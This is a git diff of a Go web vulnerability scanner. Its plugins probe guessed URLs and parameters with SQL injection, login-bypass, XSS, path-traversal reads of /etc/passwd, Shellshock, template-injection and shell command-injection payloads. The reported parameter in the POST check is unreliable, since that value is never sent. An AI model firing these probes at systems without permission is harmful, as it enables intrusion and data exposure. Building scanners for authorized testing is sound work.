@@ -9,6 +9,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"math"
 	"net"
 	"net/http"
 	"net/url"
@@ -233,7 +234,7 @@ func (p *FingerprintPlugin) Run(target ScanTarget) *Vulnerability {
 }
 
 // ==========================================
-// EXPLOI-DB INTEGRATION (RAM BASED)
+// EXPLOIT-DB INTEGRATION (RAM BASED)
 // ==========================================
 
 type EDBPlugin struct{}
@@ -241,53 +242,69 @@ type EDBPlugin struct{}
 func (p *EDBPlugin) Name() string { return "Exploit-DB Scanner" }
 
 func (p *EDBPlugin) Run(target ScanTarget) *Vulnerability {
-	// 1. First get the service name (Banner Grabbing)
-	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), 2*time.Second)
+	// 1. Banner Grabbing: Connect to the port and get service info
+
+	portStr := strconv.Itoa(target.Port)
+	address := net.JoinHostPort(target.IP, portStr)
+
+	conn, err := net.DialTimeout("tcp", address, 2*time.Second)
 	if err != nil {
 		return nil
 	}
+	defer conn.Close()
 
-	// If HTTP, request Header, else wait
-	if target.Port == 80 || target.Port == 443 {
+	// If HTTP/HTTPS port, send a HEAD request to trigger a response
+	if target.Port == 80 || target.Port == 443 || target.Port == 8080 {
 		fmt.Fprintf(conn, "HEAD / HTTP/1.0\r\n\r\n")
 	}
 
+	// Read response
 	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
-	buf := make([]byte, 512)
+	buf := make([]byte, 1024)
 	n, _ := conn.Read(buf)
-	conn.Close()
 
 	if n == 0 {
 		return nil
 	}
 	banner := string(buf[:n])
 
-	// Banner cleaning (Remove unnecessary chars)
+	// 2. Banner Cleaning & Parsing
+	// We try to extract valuable info like "Apache/2.4.49" or "vsftpd 2.3.4"
 	lines := strings.Split(banner, "\n")
 	cleanBanner := ""
+
 	for _, line := range lines {
+		// Prioritize lines containing version info
 		if strings.Contains(line, "Server:") || strings.Contains(line, "SSH") || strings.Contains(line, "FTP") {
 			cleanBanner = line
 			break
 		}
 	}
 
-	// If no clean service name found, take the first line
+	// Fallback: If no specific header found, take the first line (common in SSH/FTP)
 	if cleanBanner == "" && len(lines) > 0 {
 		cleanBanner = lines[0]
 	}
 
-	// Don't search if too short or meaningless
+	// Clean up garbage characters
+	cleanBanner = strings.ReplaceAll(cleanBanner, "Server:", "")
+	cleanBanner = strings.TrimSpace(cleanBanner)
+	// Remove non-printable characters
+	cleanBanner = strings.Map(func(r rune) rune {
+		if r >= 32 && r != 127 {
+			return r
+		}
+		return -1
+	}, cleanBanner)
+
+	// Don't search if the banner is too short or generic
 	if len(cleanBanner) < 4 {
 		return nil
 	}
 
-	// 2. CALL THE ENGINE IN NEW FOLDER!
-	// Remove "Server: " part from cleanBanner
-	searchTerm := strings.ReplaceAll(cleanBanner, "Server:", "")
-	searchTerm = strings.TrimSpace(searchTerm)
-
-	results := exploitdb.Search(searchTerm)
+	// 3. CALL THE SEARCH ENGINE
+	// Note: 'exploitdb' package must be imported correctly at the top of file
+	results := exploitdb.Search(cleanBanner)
 
 	if len(results) > 0 {
 		return &Vulnerability{
@@ -295,9 +312,9 @@ func (p *EDBPlugin) Run(target ScanTarget) *Vulnerability {
 			Name:        "Critical Exploit Detection (EDB)",
 			Severity:    "CRITICAL",
 			CVSS:        9.8,
-			Description: fmt.Sprintf("Exploit-DB records found for service version (%s):\n\n%s", searchTerm, strings.Join(results, "\n\n")),
-			Solution:    "Update or patch the service immediately.",
-			Reference:   "Exploit-DB",
+			Description: fmt.Sprintf("Exploit-DB records found for service version (%s):\n\n%s", cleanBanner, strings.Join(results, "\n\n")),
+			Solution:    "Update the service version or apply security patches immediately.",
+			Reference:   "https://www.exploit-db.com/",
 		}
 	}
 
@@ -563,13 +580,16 @@ func (p *OpenRedirectPlugin) Run(target ScanTarget) *Vulnerability {
 // NEXT 10 PLUGINS (OFFENSIVE / NEW)
 // ==========================================
 
-// 11. SQLi - V3
+// ==================================================
+// ==================================================
+// ==================================================
+// 11. SQLi - v4.2 (SMART GUESSING + TIME + POST)
+// ==================================================
 type SQLInjectionPlugin struct{}
 
-func (p *SQLInjectionPlugin) Name() string { return "SQL Injection (Professional)" }
+func (p *SQLInjectionPlugin) Name() string { return "SQL Injection (Smart Hybrid)" }
 
 func (p *SQLInjectionPlugin) Run(target ScanTarget) *Vulnerability {
-	// Only scan web ports
 	if !isWebPort(target.Port) {
 		return nil
 	}
@@ -577,59 +597,66 @@ func (p *SQLInjectionPlugin) Run(target ScanTarget) *Vulnerability {
 	client := getClient()
 	baseURL := getURL(target, "")
 
-	// ==================================================
-	// 1. ERROR-BASED PAYLOADS
-	// ==================================================
-	standardPayloads := []string{
-		"'", "''", "`", "';",
-		"' OR '1'='1",
-		"admin' --",
-		"' UNION SELECT 1, @@version --",
+	// ----------------------------------------------------
+	// PART 1: SMART ERROR-BASED (Expanded Scope)
+	// ----------------------------------------------------
+	// Instead of just checking /?id=, we guess common files and parameters.
+	endpoints := []string{
+		"/",
+		"/index.php", "/login.php", "/product.php", "/cart.php", "/news.php", "/search.php",
+		"/Default.aspx", "/Login.aspx", "/Products.aspx", "/Details.aspx", "/Comments.aspx", // Critical for ASP.NET
+		"/login", "/signin", "/search", "/view",
 	}
 
-	// Database Error Signatures (Pattern Matching)
+	params := []string{"id", "cat", "item", "u", "user", "q", "search", "query", "p", "pid", "article_id", "news_id"}
+
+	errorPayloads := []string{"'", "\"", "`", "' OR '1'='1"}
+
 	dbErrors := []string{
 		"SQL syntax", "mysql_fetch", "ORA-01756", "Oracle Error",
 		"PostgreSQL query failed", "SQLServer JDBC Driver",
-		"Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark",
+		"Microsoft OLE DB Provider", "Unclosed quotation mark",
 		"CLI Driver", "DB2 SQL error", "SQLite/JDBCDriver",
+		"System.Data.SqlClient.SqlException",
 	}
 
-	for _, payload := range standardPayloads {
-		// Construct Target URL with Payload
-		targetURL := baseURL + "/?id=" + url.QueryEscape(payload)
+	// Loop through endpoints/params to find Error-Based SQLi
+	for _, ep := range endpoints {
+		for _, param := range params {
+			for _, payload := range errorPayloads {
+				// Construct URL: http://site.com/Comments.aspx?article_id='
+				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(payload))
 
-		resp, err := client.Get(targetURL)
-		if err != nil {
-			continue
-		}
+				resp, err := client.Get(targetURL)
+				if err != nil {
+					continue
+				}
 
-		bodyBytes, _ := io.ReadAll(resp.Body)
-		resp.Body.Close()
+				bodyBytes, _ := io.ReadAll(resp.Body)
+				resp.Body.Close()
+				bodyStr := string(bodyBytes)
 
-		bodyStr := string(bodyBytes)
-
-		// A. Error-Based Detection
-		for _, errMsg := range dbErrors {
-			if strings.Contains(bodyStr, errMsg) {
-				return &Vulnerability{
-					Target:      target,
-					Name:        "SQL Injection (Error-Based)",
-					Severity:    "CRITICAL",
-					CVSS:        9.8,
-					Description: fmt.Sprintf("Database returned syntax error.\nPayload: %s\nMatch: %s", payload, errMsg),
-					Solution:    "Use Prepared Statements (PDO) or Parameterized Queries.",
-					Reference:   "OWASP A03:2021-Injection",
+				for _, errMsg := range dbErrors {
+					if strings.Contains(bodyStr, errMsg) {
+						return &Vulnerability{
+							Target:      target,
+							Name:        "SQL Injection (Error-Based)",
+							Severity:    "CRITICAL",
+							CVSS:        9.8,
+							Description: fmt.Sprintf("Database error triggered via smart parameter guessing.\nURL: %s\nPayload: %s\nMatch: %s", targetURL, payload, errMsg),
+							Solution:    "Use Prepared Statements (Parameterized Queries).",
+							Reference:   "OWASP A03:Injection",
+						}
+					}
 				}
 			}
 		}
 	}
 
-	// ==================================================
-	// 2. TIME-BASED BLIND SQLi (Latency Check)
-	// ==================================================
-	// We attempt to force the database to sleep for X seconds.
-
+	// ----------------------------------------------------
+	// PART 2: TIME-BASED BLIND SQLi (Preserved)
+	// ----------------------------------------------------
+	// Keeps checking the root /?id= parameter for time delays.
 	sleepSeconds := 5
 	timePayloads := map[string]string{
 		"MySQL/MariaDB": fmt.Sprintf("' AND SLEEP(%d)--", sleepSeconds),
@@ -638,31 +665,72 @@ func (p *SQLInjectionPlugin) Run(target ScanTarget) *Vulnerability {
 	}
 
 	for dbType, payload := range timePayloads {
+		// We still check the root 'id' for deep blind checks to save time
 		targetURL := baseURL + "/?id=" + url.QueryEscape(payload)
-
-		// Start Timer
 		start := time.Now()
-
-		// Execute Request
 		resp, err := client.Get(targetURL)
-
-		// Measure Duration
 		duration := time.Since(start)
 
 		if err == nil {
 			resp.Body.Close()
 		}
 
-		// Logic: If the request took longer than our sleep command, the DB executed it.
 		if duration.Seconds() >= float64(sleepSeconds) {
 			return &Vulnerability{
 				Target:      target,
 				Name:        fmt.Sprintf("Blind SQL Injection (%s)", dbType),
 				Severity:    "CRITICAL",
 				CVSS:        9.9,
-				Description: fmt.Sprintf("Server responded with a delay of %.2f seconds.\nTime-Based Payload: %s", duration.Seconds(), payload),
-				Solution:    "Validate user inputs and use Prepared Statements to prevent blind injection.",
+				Description: fmt.Sprintf("Server delayed response by %.2f seconds.\nTime-Based Payload: %s", duration.Seconds(), payload),
+				Solution:    "Validate inputs and use Prepared Statements.",
 				Reference:   "OWASP Blind SQL Injection",
+			}
+		}
+	}
+
+	// ----------------------------------------------------
+	// PART 3: POST / LOGIN BYPASS (Preserved)
+	// ----------------------------------------------------
+	loginPages := []string{
+		"/login.php", "/admin", "/admin.php", "/user/login", "/index.php", "/login.aspx",
+	}
+
+	postPayloads := []string{
+		"' OR '1'='1", "' OR 1=1 --", "admin' --", "admin' #", "\" OR \"1\"=\"1",
+	}
+
+	formParams := []string{"username", "user", "email", "login", "id", "txtUser", "txtPassword"} // txtUser is common in ASP.NET
+
+	for _, page := range loginPages {
+		targetEndpoint := baseURL + page
+
+		// Check baseline (invalid login)
+		baseLen, err := getPostResponseLength(client, targetEndpoint, "invalid_user_x9", "invalid_pass_x9")
+		if err != nil {
+			continue
+		}
+
+		for _, payload := range postPayloads {
+			for _, param := range formParams {
+				attackLen, err := getPostResponseLength(client, targetEndpoint, payload, "123456")
+				if err != nil {
+					continue
+				}
+
+				diff := math.Abs(float64(attackLen - baseLen))
+				isSignificant := diff > 5 || (baseLen == 0 && attackLen > 500)
+
+				if isSignificant {
+					return &Vulnerability{
+						Target:      target,
+						Name:        "SQL Injection (POST/Auth Bypass)",
+						Severity:    "CRITICAL",
+						CVSS:        9.8,
+						Description: fmt.Sprintf("Login bypass detected via POST injection on %s!\nParameter: %s\nPayload: %s\nDifference: %.0f bytes", page, param, payload, diff),
+						Solution:    "Sanitize all POST inputs and use Prepared Statements (PDO).",
+						Reference:   "OWASP Injection / Authentication Bypass",
+					}
+				}
 			}
 		}
 	}
@@ -670,23 +738,10 @@ func (p *SQLInjectionPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 12. XSS (V3 - PRO: POLYGLOT & CONTEXT AWARE)
+// 12. XSS (V3.1 - SMART CONTEXT AWARE)
 type XSSPlugin struct{}
 
-func (p *XSSPlugin) Name() string { return "XSS (Pro - Context Aware)" }
-
-// genXSSCanary generates a random token to identify our payload.
-// We use this instead of a static string like "DORM" to prevent false positives
-// from previous scans or cached pages.
-func genXSSCanary() string {
-	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
-	b := make([]byte, 6)
-	for i := range b {
-		b[i] = charset[time.Now().UnixNano()%int64(len(charset))]
-	}
-	// Example Output: "dormx9a2s1"
-	return "dorm" + string(b)
-}
+func (p *XSSPlugin) Name() string { return "XSS (Reflected - Smart)" }
 
 func (p *XSSPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
@@ -694,99 +749,50 @@ func (p *XSSPlugin) Run(target ScanTarget) *Vulnerability {
 	}
 
 	client := getClient()
-	canary := genXSSCanary()
+	// Dynamic canary to prevent false positives
+	canary := "dormxss" + fmt.Sprintf("%d", time.Now().Unix()%1000)
 
-	// We define strategic payloads to test different injection contexts.
-	// FormatStr: The placeholder '%s' will be replaced by our unique Canary token.
-	// Required: These specific characters MUST exist in the response raw (unescaped)
-	//           for the vulnerability to be considered valid.
-	tests := []struct {
-		Name      string
-		FormatStr string
-		Required  []string
-		Context   string
-	}{
-		// 1. Classic Reflection (HTML Context)
-		// <script> is obvious and often blocked by WAF. <svg> or <img> are stealthier.
-		{
-			Name:      "HTML Context (Script Tag)",
-			FormatStr: "<script>print('%s')</script>",
-			Required:  []string{"<script>", "print", canary},
-			Context:   "HTML Body",
-		},
-		{
-			Name:      "HTML Context (SVG/OnLoad)",
-			FormatStr: "<svg/onload=confirm('%s')>",
-			Required:  []string{"<svg", "onload", canary},
-			Context:   "HTML Body",
-		},
-		// 2. Attribute Injection (Breaking out of an input value)
-		// Example: <input value="USER_INPUT"> -> <input value=""><img src=x...>
-		{
-			Name:      "Attribute Breakout (Double Quote)",
-			FormatStr: "\"><img src=x onerror=prompt('%s')>",
-			Required:  []string{"\">", "<img", canary},
-			Context:   "HTML Attribute",
-		},
-		{
-			Name:      "Attribute Breakout (Single Quote)",
-			FormatStr: "';print('%s');//",
-			Required:  []string{"'", ";print", canary},
-			Context:   "JavaScript Variable",
-		},
-		// 3. Polyglot (Hybrid payload designed to break multiple contexts)
-		// Starts with javascript: protocol, closes tags, and comments out the rest.
-		{
-			Name:      "Polyglot (Filter Bypass)",
-			FormatStr: "javascript:/*--></title></style></textarea><img src=x onerror=alert('%s')//",
-			Required:  []string{"<img", "onerror", canary},
-			Context:   "Complex / Polyglot",
-		},
+	// Expanded endpoints and parameters list
+	endpoints := []string{"/", "/search", "/search.php", "/results.aspx", "/index.php", "/Search.aspx"}
+	params := []string{"q", "s", "search", "keyword", "query", "lang", "id", "msg"}
+
+	// Payloads for different contexts
+	payloads := []string{
+		fmt.Sprintf("<script>alert('%s')</script>", canary),
+		fmt.Sprintf("\"><img src=x onerror=alert('%s')>", canary),
+		fmt.Sprintf("javascript:alert('%s')//", canary),
 	}
 
-	for _, test := range tests {
-		// Construct the payload: e.g., <script>print('dormx9a2s1')</script>
-		payload := fmt.Sprintf(test.FormatStr, canary)
+	for _, ep := range endpoints {
+		for _, param := range params {
+			for _, payload := range payloads {
+				// Construct URL: http://site.com/search.php?q=<script>...
+				targetURL := fmt.Sprintf("%s%s?%s=%s", getURL(target, ""), ep, param, url.QueryEscape(payload))
 
-		// Inject payload into the URL query parameter
-		checkURL := getURL(target, "/?q="+url.QueryEscape(payload))
+				resp, err := client.Get(targetURL)
+				if err == nil {
+					defer resp.Body.Close()
 
-		resp, err := client.Get(checkURL)
-		if err == nil {
-			defer resp.Body.Close()
+					// Read only first 10KB for performance
+					headerCheck := make([]byte, 10240)
+					n, _ := resp.Body.Read(headerCheck)
+					bodyString := string(headerCheck[:n])
 
-			// Read only the first 10KB to avoid high memory usage on large responses.
-			// XSS vulnerabilities typically reflect in the header or the beginning of the body.
-			headerCheck := make([]byte, 10240)
-			n, _ := resp.Body.Read(headerCheck)
-			bodyString := string(headerCheck[:n])
-
-			// STEP 1: Detection - Is our Canary token present in the response?
-			if strings.Contains(bodyString, canary) {
-
-				// STEP 2: Verification - Are critical characters (Required) escaped?
-				// If we sent "<script>" but the server returned "&lt;script&gt;",
-				// the browser will render it as text, not code. We must ensure
-				// the dangerous tags are present in their RAW form.
-
-				isVulnerable := true
-
-				for _, req := range test.Required {
-					if !strings.Contains(bodyString, req) {
-						isVulnerable = false
-						break
-					}
-				}
-
-				if isVulnerable {
-					return &Vulnerability{
-						Target:      target,
-						Name:        "Reflected XSS (" + test.Name + ")",
-						Severity:    "HIGH",
-						CVSS:        7.2, // High severity, but requires user interaction.
-						Description: fmt.Sprintf("XSS Payload executed successfully.\nContext: %s\nPayload: %s\nSent Canary: %s", test.Context, payload, canary),
-						Solution:    "Implement Context-Aware Output Encoding (e.g., HTML Entity Encode for Body, JavaScript Hex Encode for Script). Implementing Content-Security-Policy (CSP) is also highly recommended.",
-						Reference:   "OWASP Cross Site Scripting (XSS)",
+					// 1. Check if Canary exists
+					if strings.Contains(bodyString, canary) {
+						// 2. Verification: Ensure dangerous tags are NOT escaped
+						// If we see <script> or <img, it means the server didn't sanitize it.
+						if strings.Contains(bodyString, "<script>") || strings.Contains(bodyString, "<img") || strings.Contains(bodyString, "javascript:") {
+							return &Vulnerability{
+								Target:      target,
+								Name:        "Reflected XSS (Verified)",
+								Severity:    "HIGH",
+								CVSS:        7.2,
+								Description: fmt.Sprintf("XSS Payload reflected in response body without encoding.\nURL: %s\nPayload: %s", targetURL, payload),
+								Solution:    "Implement Context-Aware Output Encoding (HTML Entity Encode).",
+								Reference:   "OWASP Cross Site Scripting (XSS)",
+							}
+						}
 					}
 				}
 			}
@@ -795,43 +801,66 @@ func (p *XSSPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 13. LFI (V2 - ENCODE & BYPASS)
+// 13. LFI (V2.1 - SMART GUESSING)
 type LFIPlugin struct{}
 
-func (p *LFIPlugin) Name() string { return "LFI (Advanced)" }
+func (p *LFIPlugin) Name() string { return "LFI (Local File Inclusion - Smart)" }
+
 func (p *LFIPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
 		return nil
 	}
 
-	payloads := []string{
-		"/etc/passwd",                                           // Direct access
-		"../../../../../../../../etc/passwd",                    // Deep traversal
-		"....//....//....//....//etc/passwd",                    // Double-dot bypass
-		"/etc/passwd%00",                                        // Null byte (Old PHP versions)
-		"php://filter/convert.base64-encode/resource=index.php", // PHP Wrapper (Source code reading)
-		"/windows/win.ini",                                      // Windows Server test
+	client := getClient()
+	baseURL := getURL(target, "")
+
+	// LFI genellikle bu dosyalarda olur
+	endpoints := []string{
+		"/", "/index.php", "/main.php", "/home.php", "/view.php",
+		"/preview.php", "/loader.php", "/include.php", "/content.php",
 	}
 
-	for _, payload := range payloads {
-		resp, err := getClient().Get(getURL(target, "/?page="+payload))
-		if err == nil {
-			defer resp.Body.Close()
-			body, _ := io.ReadAll(resp.Body)
-			content := string(body)
+	// LFI'a en açık parametreler
+	params := []string{"page", "file", "view", "include", "doc", "path", "load", "content", "lang"}
 
-			if strings.Contains(content, "root:x:0:0") ||
-				strings.Contains(content, "[fonts]") ||
-				strings.Contains(content, "PD9waH") { // Base64 PHP start (<?php)
+	payloads := []string{
+		"/etc/passwd",
+		"../../../../../../../../etc/passwd",
+		"....//....//....//....//etc/passwd",                    // WAF Bypass
+		"c:\\windows\\win.ini",                                  // Windows
+		"php://filter/convert.base64-encode/resource=index.php", // Source Code Read
+	}
 
-				return &Vulnerability{
-					Target:      target,
-					Name:        "Local File Inclusion (LFI)",
-					Severity:    "CRITICAL",
-					CVSS:        8.5,
-					Description: "Sensitive files on server are readable: " + payload,
-					Solution:    "Restrict file paths using a whitelist.",
-					Reference:   "OWASP LFI",
+	for _, ep := range endpoints {
+		for _, param := range params {
+			for _, payload := range payloads {
+				// URL: http://site.com/index.php?page=../../etc/passwd
+				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, payload)
+
+				resp, err := client.Get(targetURL)
+				if err == nil {
+					defer resp.Body.Close()
+
+					// Sadece ilk 5KB oku
+					buf := make([]byte, 5120)
+					n, _ := resp.Body.Read(buf)
+					content := string(buf[:n])
+
+					// İmza Kontrolü (Linux User, Windows Config, Base64 PHP)
+					if strings.Contains(content, "root:x:0:0") ||
+						strings.Contains(content, "[fonts]") ||
+						strings.Contains(content, "PD9waH") { // <?ph (Base64)
+
+						return &Vulnerability{
+							Target:      target,
+							Name:        "Local File Inclusion (LFI)",
+							Severity:    "CRITICAL",
+							CVSS:        8.5,
+							Description: fmt.Sprintf("Critical system file read successfully.\nURL: %s\nPayload: %s", targetURL, payload),
+							Solution:    "Restrict file paths using a whitelist or disable dynamic file inclusion.",
+							Reference:   "OWASP LFI",
+						}
+					}
 				}
 			}
 		}
@@ -1156,29 +1185,59 @@ func (p *AdminPanelPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 23. SHELLSHOCK SCANNER
+// 23. SHELLSHOCK SCANNER - v2
 type ShellshockPlugin struct{}
 
 func (p *ShellshockPlugin) Name() string { return "Shellshock Vulnerability" }
+
 func (p *ShellshockPlugin) Run(target ScanTarget) *Vulnerability {
+	// Only run on web ports
 	if !isWebPort(target.Port) {
 		return nil
 	}
-	req, _ := http.NewRequest("GET", getURL(target, "/cgi-bin/status"), nil)
-	// Shellshock Payload
-	req.Header.Set("User-Agent", "() { :;}; echo; echo 'VULNERABLE'")
-	req.Header.Set("Referer", "() { :;}; echo; echo 'VULNERABLE'")
 
+	// Target URL (CGI scripts are usually under /cgi-bin/)
+	// Common targets: /cgi-bin/status, /cgi-bin/test.cgi, /cgi-bin/admin.cgi
+	targetURL := getURL(target, "/cgi-bin/status")
+
+	req, _ := http.NewRequest("GET", targetURL, nil)
+
+	randA := 1900
+	randB := 52
+	expectedResult := "1952" // Result of 1900 + 52
+
+	// Construct the malicious Bash function
+	payload := fmt.Sprintf("() { :;}; echo; echo $((%d+%d))", randA, randB)
+
+	// Inject payload into multiple headers to maximize detection chance
+	req.Header.Set("User-Agent", payload)
+	req.Header.Set("Referer", payload)
+	req.Header.Set("X-Api-Version", payload)
+
+	// Send request using the global client
 	resp, err := getClient().Do(req)
 	if err != nil {
 		return nil
 	}
 	defer resp.Body.Close()
-	body, _ := io.ReadAll(resp.Body)
 
-	if strings.Contains(string(body), "VULNERABLE") {
-		return &Vulnerability{Target: target, Name: "Shellshock (RCE)", Severity: "CRITICAL", CVSS: 10.0, Description: "Old Bash version executes commands.", Solution: "Update Bash.", Reference: "CVE-2014-6271"}
+	bodyBytes, _ := io.ReadAll(resp.Body)
+	bodyStr := string(bodyBytes)
+
+	// VERIFICATION:
+	// We only look for the calculated result (1952).
+	if strings.Contains(bodyStr, expectedResult) {
+		return &Vulnerability{
+			Target:      target,
+			Name:        "Shellshock (RCE)",
+			Severity:    "CRITICAL",
+			CVSS:        10.0,
+			Description: fmt.Sprintf("Server executed Bash command via HTTP Headers.\nMath Calculation: $((%d+%d)) resulted in '%s'", randA, randB, expectedResult),
+			Solution:    "Update Bash immediately (CVE-2014-6271).",
+			Reference:   "CVE-2014-6271",
+		}
 	}
+
 	return nil
 }
 
@@ -1512,10 +1571,10 @@ func (p *PrometheusPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 36. SSTI (Server Side Template Injection) - v2
+// 36. SSTI (V2.1 - SMART GUESSING)
 type SSTIPlugin struct{}
 
-func (p *SSTIPlugin) Name() string { return "SSTI Test (Advanced & Verified)" }
+func (p *SSTIPlugin) Name() string { return "SSTI (Template Injection - Smart)" }
 
 func (p *SSTIPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
@@ -1523,52 +1582,45 @@ func (p *SSTIPlugin) Run(target ScanTarget) *Vulnerability {
 	}
 
 	client := getClient()
+	baseURL := getURL(target, "")
 
-	// Unique mathematical operation to minimize false positives.
-	// Operation: 1337 * 1337 = 1787569
-	const num1, num2 = 1337, 1337
+	// Matematik işlemi: 1337 * 1337 = 1787569
 	const expectedResult = "1787569"
 
-	// List of common template engine syntaxes
-	payloads := []struct {
-		Engine  string
-		Pattern string
-	}{
-		{"Jinja2/Twig (Python/PHP)", "{{%d*%d}}"},
-		{"Smarty/Mako (PHP/Python)", "${%d*%d}"},
-		{"FreeMarker/Velocity (Java)", "#{%d*%d}"},
-		{"ERB (Ruby)", "<%%= %d*%d %%>"},
+	endpoints := []string{"/", "/index.php", "/home", "/search", "/error"}
+	params := []string{"q", "s", "search", "name", "username", "id", "template", "msg"}
+
+	payloads := []string{
+		"{{1337*1337}}",    // Jinja2 / Twig
+		"${1337*1337}",     // Smarty
+		"#{1337*1337}",     // Velocity
+		"<%= 1337*1337 %>", // ERB
 	}
 
-	for _, entry := range payloads {
-		payloadStr := fmt.Sprintf(entry.Pattern, num1, num2)
-		encodedPayload := url.QueryEscape(payloadStr)
-		targetURL := getURL(target, "/?q="+encodedPayload)
+	for _, ep := range endpoints {
+		for _, param := range params {
+			for _, payload := range payloads {
+				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(payload))
 
-		resp, err := client.Get(targetURL)
-		if err == nil {
-			defer resp.Body.Close()
+				resp, err := client.Get(targetURL)
+				if err == nil {
+					defer resp.Body.Close()
+					buf := make([]byte, 4096)
+					n, _ := resp.Body.Read(buf)
+					body := string(buf[:n])
 
-			// Read response body (limited to 4KB for performance)
-			buf := make([]byte, 4096)
-			n, _ := resp.Body.Read(buf)
-			body := string(buf[:n])
-
-			// Verification Logic:
-			// 1. Check if the mathematical result exists in the response.
-			// 2. Ensure the raw payload is NOT reflected (avoids false positives from simple reflection).
-			hasResult := strings.Contains(body, expectedResult)
-			hasRawPayload := strings.Contains(body, payloadStr)
-
-			if hasResult && !hasRawPayload {
-				return &Vulnerability{
-					Target:      target,
-					Name:        fmt.Sprintf("Template Injection (SSTI) - %s", entry.Engine),
-					Severity:    "CRITICAL",
-					CVSS:        9.9,
-					Description: fmt.Sprintf("Template engine successfully executed code.\nPayload: %s\nResult: %s", payloadStr, expectedResult),
-					Solution:    "Sanitize user inputs and enforce strict context isolation in templates.",
-					Reference:   "OWASP SSTI",
+					// Eğer sonuç (1787569) sayfada varsa VE bizim ham payload yoksa (reflection değilse)
+					if strings.Contains(body, expectedResult) && !strings.Contains(body, payload) {
+						return &Vulnerability{
+							Target:      target,
+							Name:        "Server Side Template Injection (SSTI)",
+							Severity:    "CRITICAL",
+							CVSS:        9.9,
+							Description: fmt.Sprintf("Template engine executed code.\nURL: %s\nPayload: %s\nResult: %s", targetURL, payload, expectedResult),
+							Solution:    "Sanitize inputs before passing to template engine.",
+							Reference:   "OWASP SSTI",
+						}
+					}
 				}
 			}
 		}
@@ -1735,10 +1787,10 @@ func (p *PythonServerPlugin) Run(target ScanTarget) *Vulnerability {
 // DORM v7: HARDENED / PRO WEAPONS (41-50)
 // ==========================================
 
-// 41. BLIND RCE (Time Based & Verified) - v2
+// 41. BLIND RCE (V2.1 - SMART GUESSING)
 type BlindRCEPlugin struct{}
 
-func (p *BlindRCEPlugin) Name() string { return "Blind Command Injection (Time-Based & Verified)" }
+func (p *BlindRCEPlugin) Name() string { return "Blind Command Injection (Smart)" }
 
 func (p *BlindRCEPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
@@ -1746,52 +1798,45 @@ func (p *BlindRCEPlugin) Run(target ScanTarget) *Vulnerability {
 	}
 
 	client := getClient()
+	baseURL := getURL(target, "")
 
-	// 1. BASELINE CHECK
-	startBase := time.Now()
-	respBase, err := client.Get(getURL(target, "/?cmd=test_normal"))
-	if err != nil {
-		return nil
-	}
-	respBase.Body.Close()
-	baseDuration := time.Since(startBase)
-
-	// If server is naturally too slow (>4s), skip time-based checks to avoid false positives.
-	if baseDuration > 4*time.Second {
-		return nil
-	}
+	// Komut çalıştırılabilecek tehlikeli yerler
+	endpoints := []string{"/", "/ping.php", "/status.php", "/check.php", "/test.php", "/admin.php"}
+	params := []string{"cmd", "ip", "host", "addr", "query", "file", "download", "path"}
 
 	sleepSeconds := 5
-	targetSleepDuration := time.Duration(sleepSeconds) * time.Second
-
+	// Linux & Windows payloads
 	payloads := []string{
-		fmt.Sprintf("$(sleep %d)", sleepSeconds),  // Linux subshell
-		fmt.Sprintf("|sleep %d", sleepSeconds),    // Linux pipe
-		fmt.Sprintf("%%26sleep+%d", sleepSeconds), // Linux & (URL Encoded)
-		fmt.Sprintf(";sleep %d", sleepSeconds),    // Linux sequence
+		fmt.Sprintf("$(sleep %d)", sleepSeconds),
+		fmt.Sprintf("%%26sleep+%d", sleepSeconds), // &sleep 5
+		fmt.Sprintf("|sleep %d", sleepSeconds),
+		fmt.Sprintf(";sleep %d", sleepSeconds),
 	}
 
-	for _, payload := range payloads {
-		startAttack := time.Now()
+	for _, ep := range endpoints {
+		for _, param := range params {
+			for _, payload := range payloads {
+				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, payload)
 
-		respAttack, err := client.Get(getURL(target, "/?cmd="+payload))
+				start := time.Now()
+				resp, err := client.Get(targetURL)
+				duration := time.Since(start)
 
-		if err == nil {
-			respAttack.Body.Close()
-			attackDuration := time.Since(startAttack)
+				if err == nil {
+					resp.Body.Close()
+				}
 
-			// Logic: Attack Time > (Baseline + Sleep - Tolerance)
-			threshold := baseDuration + targetSleepDuration - (1 * time.Second)
-
-			if attackDuration > threshold {
-				return &Vulnerability{
-					Target:      target,
-					Name:        "Blind OS Command Injection (High Confidence)",
-					Severity:    "CRITICAL",
-					CVSS:        9.8,
-					Description: fmt.Sprintf("Server confirmed execution of 'sleep %d' payload.\nBaseline Latency: %v\nAttack Latency: %v", sleepSeconds, baseDuration, attackDuration),
-					Solution:    "Strictly validate user inputs and disable system command execution functions.",
-					Reference:   "OWASP Command Injection",
+				// Eğer sunucu bizim istediğimiz kadar (5sn) uyuduysa, içeride komut çalıştı demektir.
+				if duration.Seconds() >= float64(sleepSeconds) {
+					return &Vulnerability{
+						Target:      target,
+						Name:        "Blind OS Command Injection",
+						Severity:    "CRITICAL",
+						CVSS:        9.8,
+						Description: fmt.Sprintf("Server executed system command via time-delay.\nURL: %s\nPayload: %s\nDelay: %v", targetURL, payload, duration),
+						Solution:    "Disable system command execution functions (exec, system, passthru).",
+						Reference:   "OWASP Command Injection",
+					}
 				}
 			}
 		}
@@ -2101,10 +2146,10 @@ func (p *ConfigJsonPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 50. IDOR / BROKEN ACCESS - V2
+// 50. IDOR / BROKEN ACCESS - V2.1 (SMART)
